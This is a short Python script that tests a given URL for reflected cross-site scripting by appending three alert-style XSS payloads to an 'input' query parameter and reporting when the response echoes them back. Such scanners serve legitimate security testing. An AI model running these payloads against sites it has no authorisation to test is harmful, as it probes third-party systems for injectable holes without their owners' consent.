import requests

def check(url):
    print(f"Testing XSS on {url}")
    payloads = ["<script>alert('XSS')</script>", "\"<img src=x onerror=alert(1)>", "'<img src=x onerror=alert(1)>"]
    
    for payload in payloads:
        new_url = f"{url}?input={payload}"
        try:
            response = requests.get(new_url)
            if payload in response.text:
                print(f"Possible XSS Vulnerability found at {new_url}")
        except requests.RequestException as e:
            print(f"Error testing XSS on {url}: {e}")
